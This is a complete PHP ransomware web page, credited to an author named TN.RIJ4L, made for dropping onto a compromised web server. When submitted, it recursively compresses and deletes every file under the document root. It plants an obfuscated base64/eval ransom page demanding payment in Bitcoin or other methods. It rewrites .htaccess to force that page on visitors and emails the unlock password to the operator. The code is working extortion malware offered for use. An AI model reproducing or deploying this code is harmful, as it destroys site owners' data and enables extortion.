<title>Ransomware</title>
<meta name='description' content='Ransomeware BY TN.RIJ4L'>
<meta property='og:image'content='https://k.top4top.io/p_167339x300.jpeg'>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />
  <!-- main stylesheet -->
  <link href='http://fonts.googleapis.com/css?family=Federant' rel='stylesheet' type='text/css'/>
     <link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css" />
<style>

h1{
font-family: 'Iceland', cursive;
    text-align: center;
    color: yellow;
    font-weight: bold;
    font-size: 50px;
             
}
html {
background: #1A1C1F;
    color: red;
    text-shadow: 3px 3px 9px blue;
}
input {   border: 1px solid #15CFF4;
  width: 200px;
  height: 25px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: gold;
  font-family:Iceland;
  font-size: 13px;
 text-align: center; }
.submite{
       border-style: dotted;
    border-color: red;
    background-color: transparent;
    color: yellow;
}

</style>

<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.Locked') !== false) {
    return;
	}
	file_put_contents($filename.".Locked", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPlJhbnNvbXdhcmU8L3RpdGxlPg0KPG1ldGEgbmFtZT0nZGVzY3JpcHRpb24nIGNvbnRlbnQ9J0JZIFROLlJJajRMJz4NCjxtZXRhIHByb3BlcnR5PSdvZzppbWFnZSdjb250ZW50PSdodHRwczovLzEuYnAuYmxvZ3Nwb3QuY29tLy15ejdMV1lTd3FYRS9YdFNnYVdKSUU2SS9BQUFBQUFBQUFSYy9xYVBXNHBTemhOOEkwT0hLaUZJNU5nTnE2X3BmMG1wVlFDSzRCR0FzWUhnL3c0MjAtaDI4MC1wLWstbm8tbnUvaW1hZ2VzJTJCJTI1MjgyMSUyNTI5LmpwZWcnPg0KICAgICA8bGluayBocmVmPSJodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiAvPg0KPHN0eWxlPg0KaDEgew0KZm9udC1mYW1pbHk6ICdJY2VsYW5kJywgY3Vyc2l2ZTsNCiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgY29sb3I6IHllbGxvdzsNCiAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICBmb250LXNpemU6IDUwcHg7DQogICAgICAgICAgICAgDQp9DQpodG1sIHsNCmJhY2tncm91bmQ6ICMxQTFDMUY7DQogICAgY29sb3I6IHdoaXRlOw0KICAgIHRleHQtc2hhZG93OiAzcHggM3B4IDlweCBibHVlOw0KfQ0KaW5wdXQgeyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgY29sb3I6IHJlZDsgYm9yZGVyOiAxcHggc29saWQgeWVsbG93OyB0ZXh0LWFsaWduOiBjZW50ZXI7Zm9udC1zaXplOiAxMTsgfQ0KPC9zdHlsZT4NCg0KPD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRpbnB1dCA9ICRfUE9TVFsncGFzcyddOw0KJHBhc3MgPSAiYXJpZnBhc3MiOw0KaWYoaXNzZXQoJGlucHV0KSkgew0KaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsNCmZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsNCglpZiAoc3RycG9zKCRmaWxlbmFtZSwgJy5Mb2NrZWQnKSA9PT0gRkFMU0UpIHsNCglyZXR1cm47DQoJfQ0KCSRkZWNyeXB0ZWQgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSk7DQoJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5Mb2NrZWQnLCAnJywgJGZpbGVuYW1lKSwgJGRlY3J5cHRlZCk7DQoJdW5saW5rKCdMb2NrZWQucGhwJyk7DQoJdW5saW5rKCcuaHRhY2Nlc3MnKTsNCgl1bmxpbmsoJGZpbGVuYW1lKTsNCgllY2hvICIkZmlsZW5hbWUgRGVjcnlwdGVkICEhITxicj4iOw0KfQ0KDQpmdW5jdGlvbiBkZWNkaXIoJGRpcil7DQoJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsNCgkJZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpew0KCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7DQoJCQl9ZWxzZSB7DQoJCQkJZGVjZmlsZSgkZGlyLiIvIi4kZmlsZSk7DQoJCX0NCgl9DQp9DQoNCmRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsNCmVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOw0KdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsNCnVubGluaygnLmh0YWNjZXNzJyk7DQpjb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsNCmVjaG8gJ1N1Y2Nlc3MgISEhJzsNCn0gZWxzZSB7DQplY2hvICdGYWlsZWQgUGFzc3dvcmQgISEhIDxicj48YnI+IElmIHlvdSBkb250IGtub3cgdGhlIGRhbmdlcnMgb2YgcmFuc29td2FyZSwgcmVhZCB0aGUgYXJ0aWNsZSBoZXJlIDxicj48YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlIj4+Pj5odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlPDw8IDwvYT48YnI+WW91IGNhbiBjb250YWN0IGVtYWlscyA8YnI+ID09PT09PT09PT09PT09PT09PT09PT09PT09ICc7DQp9DQpleGl0KCk7DQp9DQo/Pg0KPGNlbnRlcj4NCjxoMT48c2NyaXB0IHR5cGU9J3RleHQvamF2YXNjcmlwdCc+DQovLzwhW0NEQVRBWw0KDQovKg0KVGVrcyBiZXJnYW50aS1nYW50aSB3YXJuYSBTY3JpcHQgYnkgTWF0dCBIZWRnZWNvZQ0KRmVhdHVyZWQgb24gSmF2YVNjcmlwdCBLaXQsIHZpc2l0IGh0dHA6Ly93d3cuamF2YXNjcmlwdGtpdC5jb20vc2NyaXB0L3NjcmlwdDIvcmFpbmJvd3RleHQuc2h0bWwNCiovDQp2YXIgdGV4dD0iIFlvdXIgV2Vic2l0ZSBJcyBMb2NrZWQgIg0KdmFyIHNwZWVkPTIvLw0KaWYgKGRvY3VtZW50LmFsbHx8ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQpew0KZG9jdW1lbnQud3JpdGUoJzxzcGFuIGlkPSJoaWdobGlnaHQiPicgKyB0ZXh0ICsgJzwvc3Bhbj4nKQ0KdmFyIHN0b3JldGV4dD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZD8gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhpZ2hsaWdodCIpIDogZG9jdW1lbnQuYWxsLmhpZ2hsaWdodA0KfQ0KZWxzZQ0KZG9jdW1lbnQud3JpdGUodGV4dCkNCnZhciBoZXg9bmV3IEFycmF5KCIwMCIsIjE0IiwiMjgiLCIzQyIsIjUwIiwiNjQiLCI3OCIsIjhDIiwiQTAiLCJCNCIsIkM4IiwiREMiLCJGMCIpDQp2YXIgcj0xDQp2YXIgZz0xDQp2YXIgYj0xDQp2YXIgc2VxPTENCmZ1bmN0aW9uIGNoYW5nZXRleHQoKXsNCnJhaW5ib3c9IiMiK2hleFtyXStoZXhbZ10raGV4W2JdDQpzdG9yZXRleHQuc3R5bGUuY29sb3I9cmFpbmJvdw0KfQ0KZnVuY3Rpb24gY2hhbmdlKCl7DQppZiAoc2VxPT02KXsNCmItLQ0KaWYgKGI9PTApDQpzZXE9MQ0KfQ0KaWYgKHNlcT09NSl7DQpyKysNCmlmIChyPT0xMikNCnNlcT02DQp9DQppZiAoc2VxPT00KXsNCmctLQ0KaWYgKGc9PTApDQpzZXE9NQ0KfQ0KaWYgKHNlcT09Myl7DQpiKysNCmlmIChiPT0xMikNCnNlcT00DQp9DQppZiAoc2VxPT0yKXsNCnItLQ0KaWYgKHI9PTApDQpzZXE9Mw0KfQ0KaWYgKHNlcT09MSl7DQpnKysNCmlmIChnPT0xMikNCnNlcT0yDQp9DQpjaGFuZ2V0ZXh0KCkNCn0NCmZ1bmN0aW9uIHN0YXJ0ZWZmZWN0KCl7DQppZiAoZG9jdW1lbnQuYWxsfHxkb2N1bWVudC5nZXRFbGVtZW50QnlJZCkNCmZsYXNoPXNldEludGVydmFsKCJjaGFuZ2UoKSIsc3BlZWQpDQp9DQpzdGFydGVmZmVjdCgpDQovL11dPg0KPC9zY3JpcHQ+PC9oMT4NCjxmb250IGNvbG9yPSJyZWQiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogM3B4IDNweCA5cHggYmx1ZTsgZm9udC1zaXplOiAxMnB4OyI+DQogICAgICAgICAgICAgICAgICAgIA0KPHByZT4NCi4uwrbCtsK2wrbCtsK2wrbCtjfigKbigKbigKbigKbigKbigKbigKbigKbigKbigKbigKbigKbCtsK2wrbCtsK2wrbCtg0K4oCmLsK2wrbCtsK2wrbCtsK2wrbCtsK24oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtg0K4oCmLsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbigKbigKbigKbigKbigKbigKbigKbigKYuLsK2wrbCtsK2wrbCtsK2wrbCtg0K4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK24oCm4oCm4oCm4oCm4oCm4oCm4oCmLsK2wrbCtsK2wrbCtsK2wrbCtg0K4oCm4oCmLi7CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApuKApi7CtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApi4uwrbCtsK2wrbCtsK2wrbCtsK2DQrigKbigKbigKbigKYuLsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtg0K4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtjfigKbigKbCtsK2wrbCtsK2wrbCtsK2wrY3DQrigKbigKbigKbigKbigKbigKbigKYuN8K2wrbCtsK2wrbCtsK2wrbCtsK24oCmLm/CtsK2wrbCtsK2wrbCtsK2DQrigKbigKbigKbigKbigKbigKbigKbigKbigKYub8K2wrbCtsK2wrbCtsK2wrbigKYuwrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApi7CtsK2wrbCtm/CtsK2wrbCtsK2wrYNCuKApuKApuKApuKApuKApuKApuKApuKApuKApi5vwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtg0K4oCm4oCm4oCm4oCm4oCm4oCm4oCmLsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtg0K4oCm4oCm4oCm4oCm4oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2Nw0K4oCm4oCm4oCm4oCm4oCmLsK2wrbCtsK24oCm4oCmwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApi4uwrbCtsK2wrbigKbigKbigKYuwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApsK2wrbCtsK2wrbCtuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApi4uwrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2DQrigKbigKbigKbigKbigKbigKbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2DQrigKbigKbigKbigKbigKbigKbigKYuN8K2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApm/CtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2wrYNCuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApuKApsK2wrbCtsK2wrbCtsK2wrbCtsK2wrbCtsK2MSANCjwvcHJlPg0KDQo8L2ZvbnQ+DQo8aDE+PFNDUklQVD4NCmZhcmJiaWJsaW90aGVrID0gbmV3IEFycmF5KCk7DQpmYXJiYmlibGlvdGhla1swXSA9IG5ldyBBcnJheSgiI0ZGMDAwMCIsIiNGRjExMDAiLCIjRkYyMjAwIiwiI0ZGMzMwMCIsIiNGRjQ0MDAiLCIjRkY1NTAwIiwiI0ZGNjYwMCIsIiNGRjc3MDAiLCIjRkY4ODAwIiwiI0ZGOTkwMCIsIiNGRmFhMDAiLCIjRkZiYjAwIiwiI0ZGY2MwMCIsIiNGRmRkMDAiLCIjRkZlZTAwIiwiI0ZGZmYwMCIsIiNGRmVlMDAiLCIjRkZkZDAwIiwiI0ZGY2MwMCIsIiNGRmJiMDAiLCIjRkZhYTAwIiwiI0ZGOTkwMCIsIiNGRjg4MDAiLCIjRkY3NzAwIiwiI0ZGNjYwMCIsIiNGRjU1MDAiLCIjRkY0NDAwIiwiI0ZGMzMwMCIsIiNGRjIyMDAiLCIjRkYxMTAwIik7DQpmYXJiYmlibGlvdGhla1sxXSA9IG5ldyBBcnJheSgiI0ZGMDAwMCIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGMDAwMCIpOw0KZmFyYmJpYmxpb3RoZWtbMl0gPSBuZXcgQXJyYXkoIiNGRkZGRkYiLCIjRkYwMDAwIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIpOw0KZmFyYmJpYmxpb3RoZWtbM10gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRkY0MDAwIiwiI0ZGODAwMCIsIiNGRkMwMDAiLCIjRkZGRjAwIiwiI0MwRkYwMCIsIiM4MEZGMDAiLCIjNDBGRjAwIiwiIzAwRkYwMCIsIiMwMEZGNDAiLCIjMDBGRjgwIiwiIzAwRkZDMCIsIiMwMEZGRkYiLCIjMDBDMEZGIiwiIzAwODBGRiIsIiMwMDQwRkYiLCIjMDAwMEZGIiwiIzQwMDBGRiIsIiM4MDAwRkYiLCIjQzAwMEZGIiwiI0ZGMDBGRiIsIiNGRjAwQzAiLCIjRkYwMDgwIiwiI0ZGMDA0MCIpOw0KZmFyYmJpYmxpb3RoZWtbNF0gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRUUwMDAwIiwiI0REMDAwMCIsIiNDQzAwMDAiLCIjQkIwMDAwIiwiI0FBMDAwMCIsIiM5OTAwMDAiLCIjODgwMDAwIiwiIzc3MDAwMCIsIiM2NjAwMDAiLCIjNTUwMDAwIiwiIzQ0MDAwMCIsIiMzMzAwMDAiLCIjMjIwMDAwIiwiIzExMDAwMCIsIiMwMDAwMDAiLCIjMTEwMDAwIiwiIzIyMDAwMCIsIiMzMzAwMDAiLCIjNDQwMDAwIiwiIzU1MDAwMCIsIiM2NjAwMDAiLCIjNzcwMDAwIiwiIzg4MDAwMCIsIiM5OTAwMDAiLCIjQUEwMDAwIiwiI0JCMDAwMCIsIiNDQzAwMDAiLCIjREQwMDAwIiwiI0VFMDAwMCIpOw0KZmFyYmJpYmxpb3RoZWtbNV0gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRkYwMDAwIiwiI0ZGMDAwMCIsIiNGRkZGRkYiLCIjRkZGRkZGIiwiI0ZGRkZGRiIpOw0KZmFyYmJpYmxpb3RoZWtbNl0gPSBuZXcgQXJyYXkoIiNGRjAwMDAiLCIjRkRGNUU2Iik7DQpmYXJiZW4gPSBmYXJiYmlibGlvdGhla1s0XTsNCmZ1bmN0aW9uIGZhcmJzY2hyaWZ0KCkNCnsNCmZvcih2YXIgaT0wIDsgaTxCdWNoc3RhYmUubGVuZ3RoOyBpKyspDQp7DQpkb2N1bWVudC5hbGxbImEiK2ldLnN0eWxlLmNvbG9yPWZhcmJlbltpXTsNCn0NCmZhcmJ2ZXJsYXVmKCk7DQp9DQpmdW5jdGlvbiBzdHJpbmcyYXJyYXkodGV4dCkNCnsNCkJ1Y2hzdGFiZSA9IG5ldyBBcnJheSgpOw0Kd2hpbGUoZmFyYmVuLmxlbmd0aDx0ZXh0Lmxlbmd0aCkNCnsNCmZhcmJlbiA9IGZhcmJlbi5jb25jYXQoZmFyYmVuKTsNCn0NCms9MDsNCndoaWxlKGs8PXRleHQubGVuZ3RoKQ0Kew0KQnVjaHN0YWJlW2tdID0gdGV4dC5jaGFyQXQoayk7DQprKys7DQp9DQp9DQpmdW5jdGlvbiBkaXZzZXJ6ZXVnZW4oKQ0Kew0KZm9yKHZhciBpPTAgOyBpPEJ1Y2hzdGFiZS5sZW5ndGg7IGkrKykNCnsNCmRvY3VtZW50LndyaXRlKCI8c3BhbiBpZD0nYSIraSsiJyBjbGFzcz0nYSIraSsiJz4iK0J1Y2hzdGFiZVtpXSArICI8L3NwYW4+Iik7DQp9DQpmYXJic2NocmlmdCgpOw0KfQ0KdmFyIGE9MTsNCmZ1bmN0aW9uIGZhcmJ2ZXJsYXVmKCkNCnsNCmZvcih2YXIgaT0wIDsgaTxmYXJiZW4ubGVuZ3RoOyBpKyspDQp7DQpmYXJiZW5baS0xXT1mYXJiZW5baV07DQp9DQpmYXJiZW5bZmFyYmVuLmxlbmd0aC0xXT1mYXJiZW5bLTFdOw0Kc2V0VGltZW91dCgiZmFyYnNjaHJpZnQoKSIsMzApOw0KfQ0KLy8NCnZhciBmYXJic2F0ej0xOw0KZnVuY3Rpb24gZmFyYnRhdXNjaGVyKCkNCnsNCmZhcmJlbiA9IGZhcmJiaWJsaW90aGVrW2ZhcmJzYXR6XTsNCndoaWxlKGZhcmJlbi5sZW5ndGg8dGV4dC5sZW5ndGgpDQp7DQpmYXJiZW4gPSBmYXJiZW4uY29uY2F0KGZhcmJlbik7DQp9DQpmYXJic2F0ej1NYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqKGZhcmJiaWJsaW90aGVrLmxlbmd0aC0wLjAwMDEpKTsNCn0NCnNldEludGVydmFsKCJmYXJidGF1c2NoZXIoKSIsNTAwMCk7DQp0ZXh0ID0iUmFuc29td2FyZSI7Ly9oDQpzdHJpbmcyYXJyYXkodGV4dCk7DQpkaXZzZXJ6ZXVnZW4oKTsNCi8vZG9jdW1lbnQud3JpdGUodGV4dCk7DQo8L1NDUklQVD48L2gxPg0KPGhyPjxmb250IGNvbG9yPSJ3aGl0ZSIgc3R5bGU9InRleHQtc2hhZG93OjBweCAwcHggMTBweCAjMDBmZmZmICwgMHB4IDBweCAxMHB4ICMwMGZmZmY7Zm9udC1zaXplOiAxMiI+PGJyPg0KPGgzPkhBQ0tFRCBCWSBUTi5SSUo0TDwvaDM+DQoNCg0KRG9uJ3QgQ2hhbmdlIHRoZSBGaWxlbmFtZSBiZWNhdXNlIGl0IENhbiBEYW1hZ2UgdGhlIEZpbGUgSWYgWW91IFdhbnQgdG8gUmV0dXJuIFlvdSBNdXN0IEVudGVyIHRoZSBQYXNzd29yZCBGaXJzdA0KPGJyPg0KU2VuZCBNZSA1MCBGb3IgQmVjayBZb3VyIFdlYnNpdGUhISA8YnI+UmFuc29tZSBCeSBUaGUgVGVhbSZuYnNwJm5ic3AmbmJzcCZuYnNwPGZvbnQgZmFjZT0iSWNlbGFuZCIgc3R5bGU9ImZvbnQtc2l6ZTogMTU7Y29sb3I6IHJlZDsiPnRpbTwvZm9udD48YnI+PGJyPg0KUGF5bWVudCBWaWEgOiBqZW1idXQgPGJyPg0KUGF5bWVudCBBZGRyZXNzIDogPGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6IDFweCBzb2xpZCAjMTVDRkY0Ow0KICB3aWR0aDogMjAwcHg7DQogIGhlaWdodDogMTVweDsNCiAgcGFkZGluZy1sZWZ0OiA1cHg7DQogIG1hcmdpbjogMTBweCBhdXRvOw0KICByZXNpemU6IG5vbmU7DQogIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50Ow0KICBjb2xvcjogZ29sZDsNCiAgZm9udC1mYW1pbHk6SWNlbGFuZDsNCiAgZm9udC1zaXplOiAxMnB4OyIgdmFsdWU9ImFsbSI+IA0KPGJyPg0KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgIzE1Q0ZGNDsNCiAgd2lkdGg6IDIwMHB4Ow0KICBoZWlnaHQ6IDE1cHg7DQogIHBhZGRpbmctbGVmdDogNXB4Ow0KICBtYXJnaW46IDEwcHggYXV0bzsNCiAgcmVzaXplOiBub25lOw0KICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsNCiAgY29sb3I6IGdvbGQ7DQogIGZvbnQtZmFtaWx5OkljZWxhbmQ7DQogIGZvbnQtc2l6ZTogMTJweDsiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHN0eWxlPSJib3JkZXI6IDFweCBzb2xpZCAjMTVDRkY0Ow0KICB3aWR0aDogNTBweDsNCiAgaGVpZ2h0OiAxNXB4Ow0KICBwYWRkaW5nLWxlZnQ6IDVweDsNCiAgbWFyZ2luOiAxMHB4IGF1dG87DQogIHJlc2l6ZTogbm9uZTsNCiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQogIGNvbG9yOiBnb2xkOw0KICBmb250LWZhbWlseTpJY2VsYW5kOw0KICBmb250LXNpemU6IDEycHg7IiB2YWx1ZT0iVW5sb2NrIj4NCjwvZm9ybT4NCjwvZm9udD48YnI+Q29udGFjdCBNYWlsIDogYXIuZ2FtaW5nODc0QGdtYWlsLmNvbQ==");
$q = str_replace('arifpass', md5($_POST['pass']), $file);
$w = str_replace('ar.gaming874@gmail.com', $_POST['email'], $q);
$e = str_replace('jembut', $_POST['via'], $w);
$r = str_replace('50', '$'.$_POST['price'], $e);
$t = str_replace('alm', $_POST['add'], $r);
$y = str_replace('tim', $_POST['team'], $t);
$dec = $y;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('Locked.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex Locked.php\n
ErrorDocument 403 /Locked.php\n
ErrorDocument 404 /Locked.php\n
ErrorDocument 500 /Locked.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}
function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
				
		}
	}
}
if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('Locked.php', $_SERVER['DOCUMENT_ROOT'].'/Locked.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$executionFile = $_SERVER['DOCUMENT_ROOT'] . '/Locked.php';

if (file_exists($executionFile)) {
    chmod($executionFile, 0444);
    echo 'File Permissions 0444 Locked.php, ';
}
$to = $_POST['email'];
$subject = 'Ransomware Info';
$message = "Web Locked: http://" . $_SERVER['SERVER_NAME'] . "/Locked.php\n\nYour Password: " . $_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>

<h1>RANSOMEWARE</h1>
<center>                     
<font color="white" style="text-shadow:0px 0px 10px #00ffff , 0px 0px 10px #00ffff;font-size: 15">
<br><br><hr><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('ar.gaming874@gmail.com','tes','tes')) { echo "ON"; } else { echo "OFF"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Ransome : <input type="text" style="color: red;font-family: Iceland;font-size: 15" name="pass">&nbsp&nbspYour Email : <input type="email" style="color: yellow;font-family: Iceland;font-size: 15" name="email">
<br><br>
payment via : <select style=" border: 1px solid #15CFF4;
  width: 200px;
  height: 25px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: gold;
  font-family:Iceland;
  font-size: 13px;
" name="via">
  <option value="Bitcoin">Bitcoin</option>
  <option value="Dana">Dana</option>
  <option value="Pay Pal">Pay pal</option>
  <option value="Perfect Money">Perfect Money</option>
  <option value="Pulse">pulse</option>
</select>&nbsp&nbsp&nbspYour Price :&nbsp&nbsp $<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="price"><br><br>&nbsp&nbsppayment address : <input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="add">&nbsp&nbspYour Team :&nbsp<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="team">
<br><br>
<input type="submit" class="submite" value="Locked">
</form></font>
<hr>
<address><small><font color="yellow">Ransomware >> BY TN.RIJ4L </font></small></address>